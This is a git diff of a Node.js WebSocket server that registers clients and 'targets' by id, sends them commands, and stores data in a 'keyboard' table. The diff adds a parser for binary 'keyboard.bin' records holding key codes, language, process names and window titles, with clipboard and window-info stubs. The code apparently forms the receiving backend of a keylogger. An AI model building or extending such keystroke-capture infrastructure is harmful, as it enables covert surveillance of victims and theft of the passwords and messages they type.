@@ -12,34 +12,16 @@ var database = mysql.createConnection({
     password : '',
     database : 'users'
 });
-/*
-//VILA I SIPED
-function readInt64BEasFloat(buffer, offset) {
-    var low = buffer.readInt32BE(buffer, offset + 4);
-    var n = buffer.readInt32BE(buffer, offset) * 4294967296.0 + low;
-    if (low < 0) n += 4294967296;
-    return n;
-}
 
-var message =[56,54,12,4,56,31,79,89];
-var buf = new Buffer(message);
-console.log(buf);
-var messageObj = {};
-var a = buf.readInt32BE(0).toString(16);
-var b = buf.readInt32BE(4).toString(16);
 
-console.log('a = ' + a);
-console.log('b = ' + b);
-//KINETS KINTSA
-*/
 //Connecting to database
-database.connect(function(err) {
+/*database.connect(function(err) {
      if (err) {
         console.error('[ERROR]Error connecting to database: ' + err.stack);
         return;
      }
      console.log('[Info]Connected to databace as id ' + database.threadId);
- });
+ });*/
 
 
 // WebSocket-сервер на порту 25565
@@ -57,7 +39,8 @@ function connection(ws) {
             ws.close();
         }
     },60000);
-    ws.on('message', function incoming(message) {
+    ws.on('message', function incoming(message, flags) {
+        if(flags['binary']){console.log(message);}
         //Try to parse JSON
         var backUpJSON = lastAnswer;
         var isParsed = true;
@@ -89,10 +72,8 @@ function connection(ws) {
                     ws.send('accepted');
                     console.log('[Info]Client is authorized ' + lastAnswer['id']);
                     isAuthorized = true;
-
                 }
                 else {
-
                     //Procesing data
                     if (lastAnswer['ok']) {
                         if(targets[lastAnswer['id']]) {
@@ -148,7 +129,7 @@ function connection(ws) {
             var test = (lastAnswer['id'] in clients);
             console.log('[INDEXOF !!!] ' + test);*/
 
-            if(lastAnswer['id'] in clients){
+            if(lastAnswer['id'] in clients) {
                  delete  clients[lastAnswer['id']];
                 //database.end();
                 console.log('[Info]Conection closed id ' + lastAnswer['id']);
@@ -160,10 +141,92 @@ function connection(ws) {
     );
 }
 
-function getData (id,type){
+function getData (id,type) {
     clients[id].send(type);
 }
 
+var fs = require('fs');
+
+fs.readFile('keyboard.bin', function (err, data) {
+    var offset = 0x0049;
+
+    var message = {};
+    message['parts'] = [];
+
+    message['count'] = data.readUInt32BE(offset);
+
+    console.log(message['count']);
+    offset += 4;
+
+    var header = parse_binary_header(data);
+
+    switch (header['type']) {
+        case 0x1:
+            message['parts'] = read_keyboard(data);
+            break;
+        case 0x2:
+
+            break;
+        default:
+            break;
+    }
+
+    function read_keyboard (data) {
+        var arr = [];
+        for(var i = 0; i < message['count']; i++ ) {
+            var partObj = {};
+            partObj['subtype'] = data.readInt8(offset);
+            offset += 1;
+            switch (partObj['subtype']) {
+                case 0x1:
+                    partObj['keyCode'] = data.readUInt32BE(offset);
+                    offset += 4;
+                    partObj['lang'] = data.readUInt16BE(offset);
+                    offset += 2;
+                    partObj['flags'] = data.readInt8(offset);
+                    offset += 1;
+                    break;
+                case 0x2:
+                    var stringObj = read_string(offset);
+                    partObj['process'] = stringObj['data'];
+                    offset = stringObj['offset'];
+
+                    stringObj = read_string(offset);
+                    partObj['title'] = stringObj['data'];
+                    offset = stringObj['offset'];
+                    break;
+                default:
+                    break;
+            }
+            arr.push(partObj);
+        }
+        return arr;
+    }
+    function read_clipboard () {}
+    function read_string (offset) {
+        var result = {};
+        var length = data.readUInt32BE(offset);
+        offset += 4;
+        result['data'] = data.toString('ascii', offset, offset + length);
+        result['offset'] = offset + length;
+        return result;
+    }
+    function read_wndinfo () {}
+
+    console.log(message);
+});
+
+
+function parse_binary_header (input) {
+    var headerObj = {};
+    headerObj['signature'] = input.readUInt16BE(0);
+    headerObj['version'] = input.readInt8(0x0002);
+    headerObj['id'] = input.toString('ascii', 0x0003, 0x0042);
+    headerObj['type'] = input.readInt8(0x0043);
+    headerObj['error'] = input.readInt8(0x0044);
+    headerObj['length'] = input.readUInt32BE(0x0045);
+    return headerObj;
+}
 /*
 database.query('SELECT * FROM keyboard', function(err, rows, fields) {
    // if (err) throw err;
@@ -175,5 +238,4 @@ database.query('SELECT * FROM keyboard', function(err, rows, fields) {
 
     console.log('The solution is: ', rows[0].solution);
 });*/
-
 
